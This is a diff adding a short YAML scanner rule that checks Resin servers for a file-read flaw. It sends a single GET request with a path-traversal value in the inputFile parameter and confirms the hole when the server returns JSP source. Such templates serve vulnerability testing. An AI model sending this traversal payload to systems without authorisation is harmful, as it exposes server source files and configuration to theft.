@@ -1,0 +1,15 @@
+id: resin-inputfile-fileread-or-ssrf
+
+info:
+    name: resin inputfile fileread
+    author: whynot(https://github.com/notwhy)
+    severity: high
+
+rules:
+    r0:
+        request:
+            method: GET
+            path: /resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=../../../../../index.jsp
+        expression: response.status == 200 && response.body.bcontains(bytes("<%@ page session=\"false\" import=\"com.caucho.vfs.*, com.caucho.server.webapp.*\" %>"))
+expression: r0()
+
